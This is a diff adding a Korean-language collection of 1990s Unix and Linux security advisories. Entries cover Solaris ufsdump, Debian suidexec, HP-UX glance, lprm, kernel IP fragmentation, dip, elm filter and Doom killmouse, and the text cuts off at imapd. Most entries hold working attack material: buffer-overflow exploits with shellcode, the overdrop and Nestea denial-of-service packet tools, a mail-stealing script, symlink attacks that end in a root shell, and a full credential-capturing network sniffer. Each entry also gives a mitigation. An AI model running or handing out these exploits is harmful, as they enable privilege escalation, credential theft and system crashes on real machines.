@@ -1,0 +1,1947 @@
+﻿
+ 제  목: [보안] 솔라리스 2.6 ufsdump,ufsrestore
+명령
+
+        /usr/lib/fs/ufs/ufsdump (and /usr/lib/fs/ufs/ufsrestore)
+
+시스템
+
+        솔라리스 2.6
+
+문제점
+
+        Seth  McGann 이 발견하였다.
+        /usr/lib/fs/ufs/ufsdump 파일은 디바이스 이름을 변경함으로써
+        세그먼트 폴트를 일으킬수 있다.
+        /usr/lib/fs/ufs/ufsrestore 파일 또한 디바이스 이름을 변경함으로써
+        세그먼트 폴트를 일으킬수 있다.
+
+        이들 약점의 발견은 간단한 다음의 명령으로 알수 있다.
+        /usr/lib/fs/ufs/ufsdump 1 `perl -e 'print "a" x 2000'`
+        /usr/lib/fs/ufs/ufsrestore xf `perl -e 'print "a" x 2000'`
+
+        다음은 그것을 이용한 버퍼 오버 플로우의 버그를 공격한 소스이다.
+
+    /* ufsdump.c
+     * Description:  Overflows a buffer to give you EGID=tty.
+     * At least that's what id reports.
+     * The running shell thinks its still the user.  Maybe I'm
+     * doing something wrong?  At any
+     * rate,  here ya go, have fun.
+     *
+     *  smm@wpi.edu
+     *  Thanks to: Jesse Schachter for the box, and
+     *  Unknown parties for the shellcode. (probably Aleph1).
+     */
+
+    #include
+    static inline getesp() {
+      __asm__(" movl %esp,%eax ");
+    }
+    main(int argc, char **argv) {
+      int i,j,buffer,offset;
+      long unsigned esp;
+      char unsigned buf[4096];
+      unsigned char
+      shellcode[]=" 쉘코드 "
+
+      buffer=895;
+      offset=3500;
+      if (argc>1)buffer=atoi(argv[1]);
+      if (argc>2)offset=atoi(argv[2]);
+      for (i=0;i> 8) & 0xFF;
+      buf[i+2]=(esp >> 16) & 0xFF;
+      buf[i+3]=(esp >> 24) & 0xFF;
+      buf[i+4]=esp & 0xFF;
+      buf[i+5]=(esp >> 8) & 0xFF;
+      buf[i+6]=(esp >> 16) & 0xFF;
+      buf[i+7]=(esp >> 24) & 0xFF;
+      printf("Offset: 0x%x\n\n",esp);
+      execl("/usr/lib/fs/ufs/ufsdump","ufsdump","1",buf,NULL);
+    }
+
+해결책
+
+
+        chmod ug-s /usr/lib/fs/ufs/ufsdump
+        chmod u-s /usr/lib/fs/ufs/ufsrestore
+다음의 패치를 가져와서 패치해라.
+105722-01: SunOS 5.6: /usr/lib/fs/ufs/ufsdump patch
+105724-01: SunOS 5.6: /usr/lib/fs/ufs/ufsrestore patch
+
+---------------------------
+
+ 제  목: [보안] 데비안 리눅스 2.0 suidexec버그
+명령
+
+        /usr/bin/suidexec
+
+시스템
+
+        데비안 리눅스 2.0
+
+문제점
+
+        /usr/bin/suidexec 프로그램은 자칫 모든 사용자들에게
+        루트쉘을 내 줄수가 있다.
+
+        /usr/bin/suidexec (프로그램) (프로그램의 경로)
+
+        이런식으로 프로그램을 돌리면 euid=0인 상태로 실행된다.
+
+
+해결책
+
+  ftp://ftp1.us.debian.org/debian/Incoming/suidmanager_0.19_all.deb)
+
+---------------------------
+
+ 제  목: [보안] HP 유닉스 galnce 버그
+명령
+
+          glance
+
+시스템
+
+           HP-UX B.10.20 D
+
+문제점
+
+           glance라는 명령을 사용하면 /tmp/.status.dce 라는 파일이 생성된다.
+           그런데 이 파일이 루트의 소유권을 가지고 생성되어서 문제가 된다.
+           다음은 이를 이용한 방법이다.
+
+            $ umask 000
+            $ cd /tmp
+            $ ln -s /.test status.dce
+            $ glance -j 1 -iterations 1 -maxpages 1
+            $ ls -l /.test
+            -rw-rw-rw-   1 root       bar           1080 Apr 27 23:06 /.test
+
+해결책
+
+            패치버젼이 나올때까지 suid를 없애라.
+
+---------------------------
+
+ 제  목: [참고] 솔라리스 보안 패치는 여기서 하는
+
+위의 사이트에 가보면 숫자가 나열되어있어요.
+각기종 마다.
+패치 번호 어쩌구로 패치 해라..라고 하면 그것을 찾아서 다운로드 받아다가
+패치 하면되요.
+패치 방법은 아주 쉽죵.
+압축 풀면 install어쩌구 하는 파일이 있는데 실행하면 끝..
+root 가 해야겠죠?
+그럼.
+
+
+ 제  목: [참고] 리눅스 스니퍼 버젼 업 5월 1일자로
+
+
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+
+int openintf(char *);
+int read_tcp(int);
+int filter(void);
+int print_header(void);
+int print_data(int, char *);
+char *hostlookup(unsigned long int);
+void clear_victim(void);
+void cleanup(int);
+
+struct etherpacket
+{
+   struct ethhdr eth;
+   struct iphdr  ip;
+   struct tcphdr tcp;
+   char buff[8193];
+}ep;
+
+struct
+{
+   unsigned long      saddr;
+   unsigned long      daddr;
+   unsigned short     sport;
+   unsigned short     dport;
+   int                bytes_read;
+   char               active;
+   time_t             start_time;
+} victim;
+
+struct iphdr  *ip;
+struct tcphdr *tcp;
+int s;
+FILE *fp;
+
+#define CAPTLEN 1024
+#define TIMEOUT 31
+#define TCPLOG "/root/private/.sniff.log"
+
+int openintf(char *d)
+{
+   int fd;
+   struct ifreq ifr;
+   int s;
+   fd=socket(AF_INET, SOCK_PACKET, htons(0x800));
+   if(fd < 0)
+   {
+      perror("cant get SOCK_PACKET socket");
+      exit(0);
+   }
+   strcpy(ifr.ifr_name, d);
+   s=ioctl(fd, SIOCGIFFLAGS, &ifr);
+   if(s < 0)
+   {
+      close(fd);
+      perror("cant get flags");
+      exit(0);
+   }
+   ifr.ifr_flags |= IFF_PROMISC;
+   s=ioctl(fd, SIOCSIFFLAGS, &ifr);
+   if(s < 0) perror("Yo Mama! She Aint No Slut! (cant set promiscuous
+mode)");
+   return fd;
+}
+
+int read_tcp(int s)
+{
+   int x;
+   while(1)
+   {
+      x=read(s, (struct etherpacket *)&ep, sizeof(ep));
+      if(x > 1)
+      {
+         if(filter()==0) continue;
+         x=x-54;
+         if(x < 1) continue;
+         return x;
+      }
+   }
+}
+
+int filter(void)
+{
+   int p;
+   p=0;
+   if(ip->protocol != 6) return 0;
+   if(victim.active != 0)
+      if(victim.bytes_read > CAPTLEN)
+      {
+         fprintf(fp, "\n-----+ [CAPLEN Exceeded]+\n");
+         clear_victim();
+         return 0;
+      }
+   if(victim.active != 0)
+      if(time(NULL) > (victim.start_time + TIMEOUT))
+      {
+         fprintf(fp, "\n-----+ [Timed Out]+\n");
+         clear_victim();
+         return 0;
+      }
+
+   if(ntohs(tcp->dest)==21)  p=1; /* ftp */
+   if(ntohs(tcp->dest)==23)  p=1; /* telnet */
+   if(ntohs(tcp->dest)==110) p=1; /* pop3 */
+   if(ntohs(tcp->dest)==109) p=1; /* pop2 */
+   if(ntohs(tcp->dest)==143) p=1; /* imap2 */
+   if(ntohs(tcp->dest)==513) p=1; /* rlogin */
+   if(ntohs(tcp->dest)==106) p=1; /* poppasswd */
+   if(victim.active == 0)
+      if(p == 1)
+         if(tcp->syn == 1)
+         {
+            victim.saddr=ip->saddr;
+            victim.daddr=ip->daddr;
+            victim.active=1;
+            victim.sport=tcp->source;
+            victim.dport=tcp->dest;
+            victim.bytes_read=0;
+            victim.start_time=time(NULL);
+            print_header();
+         }
+   if(tcp->dest != victim.dport) return 0;
+   if(tcp->source != victim.sport) return 0;
+   if(ip->saddr != victim.saddr) return 0;
+   if(ip->daddr != victim.daddr) return 0;
+   if(tcp->rst == 1)
+   {
+      victim.active=0;
+      alarm(0);
+      fprintf(fp, "\n----- [RST]\n");
+      clear_victim();
+      return 0;
+   }
+   if(tcp->fin == 1)
+   {
+      victim.active=0;
+      alarm(0);
+      fprintf(fp, "\n----- [FIN]\n");
+      clear_victim();
+      return 0;
+   }
+   return 1;
+}
+
+int print_header(void)
+{
+   fprintf(fp, "\n");
+   fprintf(fp, "%s => ", hostlookup(ip->saddr));
+   fprintf(fp, "%s [%d]\n", hostlookup(ip->daddr), ntohs(tcp->dest));
+}
+
+int print_data(int datalen, char *data)
+{
+   int i=0;
+   int t=0;
+
+   victim.bytes_read=victim.bytes_read+datalen;
+   for(i=0;i != datalen;i++)
+   {
+      if(data[i] == 13) { fprintf(fp, "\n"); t=0; }
+      if(isprint(data[i])) {fprintf(fp, "%c", data[i]);t++;}
+      if(t > 75) {t=0;fprintf(fp, "\n");}
+   }
+}
+
+
+main(int argc, char **argv)
+{
+   s=openintf("eth0");
+   ip=(struct iphdr *)(((unsigned long)&ep.ip)-2);
+   tcp=(struct tcphdr *)(((unsigned long)&ep.tcp)-2);
+   signal(SIGHUP, SIG_IGN);
+   signal(SIGINT, cleanup);
+   signal(SIGTERM, cleanup);
+   signal(SIGKILL, cleanup);
+   signal(SIGQUIT, cleanup);
+   if(argc == 2) fp=stdout;
+   else fp=fopen(TCPLOG, "at");
+   if(fp == NULL) { fprintf(stderr, "Sorry... cant open log file. gotta
+create it first eg: touch %s \n",TCPLOG);exit(0);}
+   clear_victim();
+   for(;;)
+   {
+      read_tcp(s);
+      if(victim.active != 0)
+print_data(htons(ip->tot_len)-sizeof(ep.ip)-sizeof(ep.tcp), ep.buff-2);
+      fflush(fp);
+   }
+}
+
+char *hostlookup(unsigned long int in)
+{
+   static char blah[1024];
+   struct in_addr i;
+   struct hostent *he;
+
+   i.s_addr=in;
+   he=gethostbyaddr((char *)&i, sizeof(struct in_addr),AF_INET);
+   if(he == NULL) strcpy(blah, inet_ntoa(i));
+   else strcpy(blah, he->h_name);
+   return blah;
+}
+
+void clear_victim(void)
+{
+   victim.saddr=0;
+   victim.daddr=0;
+   victim.sport=0;
+   victim.dport=0;
+   victim.active=0;
+   victim.bytes_read=0;
+   victim.start_time=0;
+}
+
+void cleanup(int sig)
+{
+   fprintf(fp, "Awww.... that hurts!....\n");
+   close(s);
+   fclose(fp);
+   exit(0);
+}
+
+설마 악용하지는않겠죵?
+관리자들이 해킹이나 크래킹 하는 사람을 잡을때 이것을 사용하면 약간이나마
+도움이 될 것이고
+이것을 악용하다가 걸리면 죽음.
+
+참고로 버퍼 사이즈를 크게 늘리면 그 만큼 스니핑 된 자료가 더 커짐니다.
+이것의 의미는 하나의 유저가 사용한 것의 양을 좀더 많이 스니핑 할 수 있다는
+것이죠.
+함정파고 기다리면 잡히는 그런 일을 할 수가 있어용.
+char buff[8193];
+위의 문자를 위의 소스에서 가져다가 8193 이라는 크기를 더 크게 하면
+버퍼 양이 더 커집니다.
+그럼.
+
+---------------------------
+
+ 제  목: [보안] 레드햇 4.2 or 리눅스 lprm 버그
+명령
+
+        lprm
+
+시스템
+
+        리눅스 ( 레드햇 4.2)
+
+문제점
+
+        Chris Evans 라는 사람이 리눅스 lprm 버그를 발견하였다.
+        인수 체크를 하지 않아서 생기는 버퍼 오버 플로우 버그이다.
+
+        그 소스이다.
+
+#include
+#define PRINTER "-Pwhatever"
+
+
+static inline getesp() {
+  __asm__(" movl %esp,%eax ");
+}
+
+main(int argc, char **argv) {
+  int i,j,buffer,offset;
+  long unsigned esp;
+  char unsigned buf[4096];
+
+  unsigned char
+  shellcode[]="\x89\xe1\x31\xc0\x50\x8d\x5c\x24\xf9\x83\xc4\x0c"
+             "\x50\x53\x89\xca\xb0\x0b\xcd\x80/bin/sh";
+
+  buffer=990;
+  offset=3000;
+
+  if (argc>1)buffer=atoi(argv[1]);
+  if (argc>2)offset=atoi(argv[2]);
+
+
+  for (i=0;i> 8) & 0xFF;
+  buf[i+2]=(esp >> 16) & 0xFF;
+  buf[i+3]=(esp >> 24) & 0xFF;
+
+  buf[i+4]=esp & 0xFF;
+  buf[i+5]=(esp >> 8) & 0xFF;
+  buf[i+6]=(esp >> 16) & 0xFF;
+  buf[i+7]=(esp >> 24) & 0xFF;
+
+  printf("Offset: 0x%x\n\n",esp);
+
+  execl("/usr/bin/lprm","lprm",PRINTER,buf,NULL);
+}
+
+해결책
+
+          chmod 700 /usr/bin/lprm 으로 우선 막아두자. 패치 버젼이 나올때까지
+
+---------------------------
+
+ 제  목: [보안] 리눅스 OverDrop 공격
+명령
+
+        overdrop
+
+시스템
+
+        리눅스 커널 2.0.33
+
+문제점
+
+다음과 같은 소스의 공격으로 무너진다.
+        다음과 같은 소스의 공격으로 무너진다.
+
+
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+
+#define IP_MF   0x2000
+#define IPH     0x14
+#define UDPH    0x8
+#define PADDING 0x1c
+#define MAGIC   0x3
+#define COUNT   0xBEEF
+#define FRAG2   0xFFFF
+
+void usage(char *name) {
+  fprintf(stderr,"%s dst_ip [ -n how_many ] [ -s src_ip ] [ -x ] (use -x for exp
+ress delivery).\n",name);
+  exit(0);
+}
+
+u_long name_resolve(char *host_name) {
+  struct in_addr addr;
+  struct hostent *host_ent;
+  if ((addr.s_addr=inet_addr(host_name))==-1) {
+    if (!(host_ent=gethostbyname(host_name))) return (0);
+    bcopy(host_ent->h_addr,(char *)&addr.s_addr,host_ent->h_length);
+  }
+  return (addr.s_addr);
+}
+
+
+void send_frags(int sock,u_long src_ip,u_long dst_ip,u_short src_prt,u_short dst
+_prt) {
+  u_char *packet=NULL,*p_ptr=NULL;
+  u_char byte;
+  struct sockaddr_in sin;
+  sin.sin_family=AF_INET;
+  sin.sin_port=src_prt;
+  sin.sin_addr.s_addr=dst_ip;
+  packet=(u_char *)malloc(IPH+UDPH+PADDING);
+  p_ptr=packet;
+  bzero((u_char *)p_ptr,IPH+UDPH+PADDING);
+  byte=0x45;
+  memcpy(p_ptr,&byte,sizeof(u_char));
+  p_ptr+=2;
+  *((u_short *)p_ptr)=htons(IPH+UDPH+PADDING);
+  p_ptr+=2;
+  *((u_short *)p_ptr)=htons(242);
+  p_ptr+=2;
+  *((u_short *)p_ptr)|=htons(IP_MF);
+  p_ptr+=2;
+  *((u_short *)p_ptr)=0x40;
+  byte=IPPROTO_UDP;
+  memcpy(p_ptr+1,&byte,sizeof(u_char));
+  p_ptr+=4;
+  *((u_long *)p_ptr)=src_ip;
+  p_ptr+=4;
+  *((u_long *)p_ptr)=dst_ip;
+  p_ptr+=4;
+  *((u_short *)p_ptr)=htons(src_prt);
+  p_ptr+=2;
+  *((u_short *)p_ptr)=htons(dst_prt);
+  p_ptr+=2;
+  *((u_short *)p_ptr)=htons(8+PADDING);
+  if (sendto(sock,packet,IPH+UDPH+PADDING,0,(struct sockaddr *)&sin,
+      sizeof(struct sockaddr))==-1) {
+    perror("\nsendto");
+    free(packet);
+    exit(1);
+  }
+  p_ptr=&packet[2];
+  *((u_short *)p_ptr)=htons(IPH+MAGIC+1);
+  p_ptr+=4;
+  *((u_short *)p_ptr)=htons(FRAG2);
+  if (sendto(sock,packet,IPH+MAGIC+1,0,(struct sockaddr *)&sin,
+      sizeof(struct sockaddr))==-1) {
+    perror("\nsendto");
+    free(packet);
+    exit(1);
+  }
+  free(packet);
+}
+
+
+int main(int argc, char **argv) {
+  int one=1,count=0,i,rip_sock,lag=500;
+  u_long  src_ip=0,dst_ip=0;
+  u_short src_prt=0,dst_prt=0;
+  struct in_addr addr;
+  fprintf(stderr,"overdrop by lcamtuf [based on teardrop by route|daemon9]\n\n")
+;
+  if((rip_sock=socket(AF_INET,SOCK_RAW,IPPROTO_RAW))<0) {
+    perror("raw socket");
+    exit(1);
+  }
+  if (setsockopt(rip_sock,IPPROTO_IP,IP_HDRINCL,(char *)&one,sizeof(one))<0) {
+    perror("IP_HDRINCL");
+    exit(1);
+  }
+  if (argc < 2) usage(argv[0]);
+  if (!(dst_ip=name_resolve(argv[1]))) {
+    fprintf(stderr,"Can't resolve destination address.\n");
+    exit(1);
+  }
+  while ((i=getopt(argc,argv,"s:n:x"))!=EOF) {
+    switch (i) {
+      case 'n':
+        count   = atoi(optarg);
+        break;
+      case 's':
+        if (!(src_ip=name_resolve(optarg))) {
+          fprintf(stderr,"Can't resolve source address.\n");
+          exit(1);
+        }
+        break;
+      case 'x':
+        lag=0;
+        break;
+      default:
+        usage(argv[0]);
+        break;
+    }
+  }
+  srandom((unsigned)(time((time_t)0)));
+  if (!count) count=COUNT;
+  fprintf(stderr,"Sending oversized packets:\nFrom: ");
+  if (!src_ip) fprintf(stderr,"       (random)"); else {
+    addr.s_addr = src_ip;
+    fprintf(stderr,"%15s",inet_ntoa(addr));
+  }
+  addr.s_addr = dst_ip;
+  fprintf(stderr,"\n  To: %15s\n",inet_ntoa(addr));
+  fprintf(stderr," Amt: %5d\n",count);
+  fprintf(stderr,"[ ");
+  for (i=0;iiph->saddr));
+        라는 부분을 찾아서 이렇게 고치면 된다.
+NETDEBUG(printk("Oversized IP packet from %s.\n", in_ntoa(qp->iph->saddr)));
+        그런후에 커널 컴파일을 시작하면된다.
+
+---------------------------
+
+ 제  목: [보안] linux"off by one ip header" 버그
+
+명령
+
+        off by one ip header 버그
+
+시스템
+
+        리눅스 2.0.x 2.1.x
+문제점
+        다음과 같은 소스로 공격할 수 있다.
+
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+
+// bsd usage is currently broken because of socket options on the third sendto
+
+#ifdef STRANGE_BSD_BYTE_ORDERING_THING
+                        /* OpenBSD < 2.1, all FreeBSD and netBSD, BSDi < 3.0 */
+#define FIX(n)  (n)
+#else                   /* OpenBSD 2.1, all Linux */
+#define FIX(n)  htons(n)
+#endif  /* STRANGE_BSD_BYTE_ORDERING_THING */
+
+#define IP_MF   0x2000  /* More IP fragment en route */
+#define IPH     0x14    /* IP header size */
+#define UDPH    0x8     /* UDP header size */
+#define MAGIC2  108
+#define PADDING 256    /* datagram frame padding for first packet */
+#define COUNT   500    /* we are overwriting a small number of bytes we
+                        shouldnt have access to in the kernel.
+                        to be safe, we should hit them till they die :>  */
+
+void usage(u_char *);
+u_long name_resolve(u_char *);
+u_short in_cksum(u_short *, int);
+void send_frags(int, u_long, u_long, u_short, u_short);
+
+int main(int argc, char **argv)
+{
+    int one = 1, count = 0, i, rip_sock;
+    u_long  src_ip = 0, dst_ip = 0;
+    u_short src_prt = 0, dst_prt = 0;
+    struct in_addr addr;
+
+
+    if((rip_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
+    {
+        perror("raw socket");
+        exit(1);
+    }
+    if (setsockopt(rip_sock, IPPROTO_IP, IP_HDRINCL, (char *)&one, sizeof(one))
+        < 0)
+    {
+        perror("IP_HDRINCL");
+        exit(1);
+    }
+    if (argc < 3) usage(argv[0]);
+    if (!(src_ip = name_resolve(argv[1])) || !(dst_ip = name_resolve(argv[2])))
+    {
+        fprintf(stderr, "What the hell kind of IP address is that?\n");
+        exit(1);
+    }
+
+    while ((i = getopt(argc, argv, "s:t:n:")) != EOF)
+    {
+        switch (i)
+        {
+            case 's':               /* source port (should be emphemeral) */
+                src_prt = (u_short)atoi(optarg);
+                break;
+            case 't':               /* dest port (DNS, anyone?) */
+                dst_prt = (u_short)atoi(optarg);
+                break;
+            case 'n':               /* number to send */
+                count   = atoi(optarg);
+                break;
+            default :
+                usage(argv[0]);
+                break;              /* NOTREACHED */
+        }
+    }
+    srandom((unsigned)(time((time_t)0)));
+    if (!src_prt) src_prt = (random() % 0xffff);
+    if (!dst_prt) dst_prt = (random() % 0xffff);
+    if (!count)   count   = COUNT;
+
+    fprintf(stderr, "Nestea by humble\nCode ripped from teardrop by route / daem
+on9\n");
+    fprintf(stderr, "Death on flaxen wings (yet again):\n");
+    addr.s_addr = src_ip;
+    fprintf(stderr, "From: %15s.%5d\n", inet_ntoa(addr), src_prt);
+    addr.s_addr = dst_ip;
+    fprintf(stderr, "  To: %15s.%5d\n", inet_ntoa(addr), dst_prt);
+    fprintf(stderr, " Amt: %5d\n", count);
+    fprintf(stderr, "[ ");
+
+    for (i = 0; i < count; i++)
+    {
+        send_frags(rip_sock, src_ip, dst_ip, src_prt, dst_prt);
+        fprintf(stderr, "b00m ");
+        usleep(500);
+    }
+    fprintf(stderr, "]\n");
+    return (0);
+}
+
+void send_frags(int sock, u_long src_ip, u_long dst_ip, u_short src_prt,
+                u_short dst_prt)
+{
+int i;
+    u_char *packet = NULL, *p_ptr = NULL;   /* packet pointers */
+    u_char byte;                            /* a byte */
+    struct sockaddr_in sin;                 /* socket protocol structure */
+
+    sin.sin_family      = AF_INET;
+    sin.sin_port        = src_prt;
+    sin.sin_addr.s_addr = dst_ip;
+
+    packet = (u_char *)malloc(IPH + UDPH + PADDING+40);
+    p_ptr  = packet;
+    bzero((u_char *)p_ptr, IPH + UDPH + PADDING);
+
+    byte = 0x45;                        /* IP version and header length */
+    memcpy(p_ptr, &byte, sizeof(u_char));
+    p_ptr += 2;                         /* IP TOS (skipped) */
+    *((u_short *)p_ptr) = FIX(IPH + UDPH + 10);    /* total length */
+    p_ptr += 2;
+    *((u_short *)p_ptr) = htons(242);   /* IP id */
+    p_ptr += 2;
+    *((u_short *)p_ptr) |= FIX(IP_MF);  /* IP frag flags and offset */
+    p_ptr += 2;
+    *((u_short *)p_ptr) = 0x40;         /* IP TTL */
+    byte = IPPROTO_UDP;
+    memcpy(p_ptr + 1, &byte, sizeof(u_char));
+    p_ptr += 4;                         /* IP checksum filled in by kernel */
+    *((u_long *)p_ptr) = src_ip;        /* IP source address */
+    p_ptr += 4;
+    *((u_long *)p_ptr) = dst_ip;        /* IP destination address */
+    p_ptr += 4;
+    *((u_short *)p_ptr) = htons(src_prt);       /* UDP source port */
+    p_ptr += 2;
+    *((u_short *)p_ptr) = htons(dst_prt);       /* UDP destination port */
+    p_ptr += 2;
+    *((u_short *)p_ptr) = htons(8 + 10);   /* UDP total length */
+
+    if (sendto(sock, packet, IPH + UDPH + 10, 0, (struct sockaddr *)&sin,
+                sizeof(struct sockaddr)) == -1)
+    {
+        perror("\nsendto");
+        free(packet);
+        exit(1);
+    }
+
+    p_ptr  = packet;
+    bzero((u_char *)p_ptr, IPH + UDPH + PADDING);
+
+    byte = 0x45;                        /* IP version and header length */
+    memcpy(p_ptr, &byte, sizeof(u_char));
+    p_ptr += 2;                         /* IP TOS (skipped) */
+    *((u_short *)p_ptr) = FIX(IPH + UDPH + MAGIC2);    /* total length */
+    p_ptr += 2;
+    *((u_short *)p_ptr) = htons(242);   /* IP id */
+    p_ptr += 2;
+    *((u_short *)p_ptr) = FIX(6);  /* IP frag flags and offset */
+    p_ptr += 2;
+    *((u_short *)p_ptr) = 0x40;         /* IP TTL */
+    byte = IPPROTO_UDP;
+    memcpy(p_ptr + 1, &byte, sizeof(u_char));
+    p_ptr += 4;                         /* IP checksum filled in by kernel */
+    *((u_long *)p_ptr) = src_ip;        /* IP source address */
+    p_ptr += 4;
+    *((u_long *)p_ptr) = dst_ip;        /* IP destination address */
+    p_ptr += 4;
+    *((u_short *)p_ptr) = htons(src_prt);       /* UDP source port */
+    p_ptr += 2;
+    *((u_short *)p_ptr) = htons(dst_prt);       /* UDP destination port */
+    p_ptr += 2;
+    *((u_short *)p_ptr) = htons(8 + MAGIC2);   /* UDP total length */
+
+    if (sendto(sock, packet, IPH + UDPH + MAGIC2, 0, (struct sockaddr *)&sin,
+                sizeof(struct sockaddr)) == -1)
+    {
+        perror("\nsendto");
+        free(packet);
+        exit(1);
+    }
+
+    p_ptr  = packet;
+    bzero((u_char *)p_ptr, IPH + UDPH + PADDING+40);
+    byte = 0x4F;                        /* IP version and header length */
+    memcpy(p_ptr, &byte, sizeof(u_char));
+    p_ptr += 2;                         /* IP TOS (skipped) */
+    *((u_short *)p_ptr) = FIX(IPH + UDPH + PADDING+40);    /* total length */
+    p_ptr += 2;
+    *((u_short *)p_ptr) = htons(242);   /* IP id */
+    p_ptr += 2;
+    *((u_short *)p_ptr) = 0 | FIX(IP_MF);  /* IP frag flags and offset */
+    p_ptr += 2;
+    *((u_short *)p_ptr) = 0x40;         /* IP TTL */
+    byte = IPPROTO_UDP;
+    memcpy(p_ptr + 1, &byte, sizeof(u_char));
+    p_ptr += 4;                         /* IP checksum filled in by kernel */
+    *((u_long *)p_ptr) = src_ip;        /* IP source address */
+    p_ptr += 4;
+    *((u_long *)p_ptr) = dst_ip;        /* IP destination address */
+    p_ptr += 44;
+    *((u_short *)p_ptr) = htons(src_prt);       /* UDP source port */
+    p_ptr += 2;
+    *((u_short *)p_ptr) = htons(dst_prt);       /* UDP destination port */
+    p_ptr += 2;
+    *((u_short *)p_ptr) = htons(8 + PADDING);   /* UDP total length */
+
+        for(i=0;ih_addr, (char *)&addr.s_addr, host_ent->h_length);
+    }
+    return (addr.s_addr);
+}
+
+void usage(u_char *name)
+{
+    fprintf(stderr,
+            "%s src_ip dst_ip [ -s src_prt ] [ -t dst_prt ] [ -n how_many ]\n",
+            name);
+    exit(0);
+}
+
+
+해결책
+        다음과 같이 커널 소스를 수정해서 커널 컴파일을 다시 해라
+        커널 소스중에 ip_fragment.c 를 찾아서 수정하면된다.
+        에디터로 불러내서
+        if (fp->len < 0 || count+fp->len > skb->len)
+        부분을
+        if (fp->len < 0 || fp->offset+qp->ihlen+fp->len > skb->len)
+        라고 수정한후에 커널 컴파일 하면된다.
+
+---------------------------
+
+ 제  목: [보안] 리눅스 슬랙 3.4 dip 버그
+명령
+
+        dip 3.3.7o
+
+시스템
+
+        리눅스
+
+문제점
+
+        인수 체크를 하지 않아서 생기는 버퍼 오버 플로우 버그이다.
+        다음의 소스를 보면 문제점을 발견할 수 있다.
+
+        (dip 프로그램의 main.c 소스의 일부)
+        189 번째 줄 부터 시작
+          return;
+        }
+
+        sprintf(buf,"%s/LCK..%s", _PATH_LOCKD, nam);
+
+        fp = fopen(buf,"r");
+        if (fp == (FILE *)0) {
+        .... (생략)
+
+        위에서 보다 시피 sprintf() 함수부분에서 인수 체크를 하지 않는다.
+
+        이를 이용해서 세그먼트 폴트를 낼 수가 있다.
+
+        dip -k -l `perl -e 'print "a" x 2000'`
+
+        위의 커맨드를 입력시키면
+
+        DIP: cannot open /var/lock/LCK..aaaaaaaaaaaaaaaa(중간생략 2000개)
+        aaaaaaaaaaaa:No such file or directory
+        Segmentation fault
+        이렇게 되어서 위험성을 노출 시킨다.
+
+해결책
+
+        dip 소스의 main.c 함수중에
+        189번째 줄 부근에
+          return;
+        }
+
+        sprintf(buf,"%s/LCK..%s", _PATH_LOCKD, nam);
+
+        fp = fopen(buf,"r");
+        if (fp == (FILE *)0) {
+
+        에서
+        sprintf(buf,"%s/LCK..%s", _PATH_LOCKD, nam); 을
+        snprintf(buf,sizeof(buf),"%s/LCK..%s", _PATH_LOCKD, nam); 로 바꾼다.
+
+        아니면 chmod -s dip 를 한후에 패치 버젼이 나오면 바꾼다.
+
+---------------------------
+
+ 제  목: [보안] elm의 유틸인 filter
+명령
+
+        filter, an elm utility
+
+시스템
+
+        linux - Slackware 3.0, others with sgid mail filter
+
+문제점
+
+        셋유저 그룹id가 결려 있기 때분에 이를 이용해 남의 메일을 읽어 낼 수
+        있다.
+        보안상 헛점이다.
+
+
+#!/bin/sh
+# This shell script exploits a problem with filter(1L)
+# it will follow symbolic links, on a read allowing
+# us to steal a users mail file.
+#
+
+cp /var/spool/mail/$LOGNAME ~
+cp /dev/null /var/spool/mail/$LOGNAME
+echo 'if (always) forward' $LOGNAME > /tmp/fread-ftr.tmp
+
+cat << _EOF_ >> /tmp/fread-msg.tmp
+From: Dave
+To: $LOGNAME
+Subject: Filter Exploit
+
+_EOF_
+
+echo sleep 2 > /tmp/fread-sh.tmp
+echo cat /tmp/fread-msg.tmp >> /tmp/fread-sh.tmp
+chmod +x /tmp/fread-sh.tmp
+/tmp/fread-sh.tmp|filter -f /tmp/fread-ftr.tmp &
+FREAD=`ps|grep 'filter -f'|grep -v grep|awk '{print $1}'`
+rm -f /tmp/filter.$FREAD
+ln -s /var/spool/mail/$1 /tmp/filter.$FREAD
+sleep 2
+rm -f /tmp/fread-ftr.tmp /tmp/fread-msg.tmp /tmp/fread-sh.tmp
+/tmp/fread-ftr.tmp /tmp/filter.$FREAD
+FREAD=
+
+cp /var/spool/mail/$LOGNAME ~/$1.mail
+cp ~/$LOGNAME /var/spool/mail
+more ~/$1.mail
+
+해결
+
+        셋유저그룹을 없애라.
+
+---------------------------
+
+ 제  목: [보안] 리눅스 Doom(3)
+명령
+
+        /usr/games/doom/killmouse
+
+시스템
+
+        Slackware 3.0, other distributions might be too.
+
+문제점
+
+        startmouse 처럼 이번에는 killmouse 이용하여 보안상 헛점을 발견
+        할 수 있다.
+
+         /usr/games/doom/startmouse.sh:
+         #!/bin/sh
+         if [ -r /tmp/gpmkilled ]; then
+           /usr/bin/grep gpm /etc/rc.d/rc.local > /tmp/gpmscript
+           /bin/sh /tmp/gpmscript; /bin/rm /tmp/gpmscript /tmp/gpmkilled
+         fi
+
+         /usr/games/doom/killmouse.sh:
+         #!/bin/sh
+         if /bin/ps ax | /usr/bin/grep -v grep | /usr/bin/grep "gpm" ;
+
+then
+           GPM_RUNNING=true; /bin/killall gpm; /bin/touch /tmp/gpmkilled
+         fi
+
+
+
+
+
+         $ touch /tmp/gpmkilled
+         $ /usr/games/doom/startmouse
+
+         ps -aux | grep gpm
+         bo        1436  0.0  2.0   40  312 v03 R    16:33   0:00 grep gpm
+         root      1407  0.0  2.4   42  368  ?  S    16:24   0:00
+/usr/bin/gpm t ms
+
+    Fine,   it's   running.   Now   we'll  use  killmouse  to kill the
+    process, but first we set  our umask to 0 and  link /tmp/gpmkilled
+    to /root/.rhosts:
+
+         $ umask 0
+         $ ln -s /root/.rhosts /tmp/gpmkilled
+         $ /usr/games/doom/killmouse
+          1407  ?  S     0:00 gpm t ms
+
+         $ ls -l /root/.rhosts
+         -rw-rw-rw-   1 root     users           0 Dec 13 16:44
+/root/.rhosts
+
+         $ echo localhost bo > /root/.rhosts
+
+         $ rsh -l root localhost sh -i
+         bash#
+
+해결
+        killmouse와 startmouse 의 setuid 를 모두 없애라
+
+---------------------------
+
+ 제  목: [보안] 리눅스 imapd
+명령
+
+        imapd
+
+시스템
+
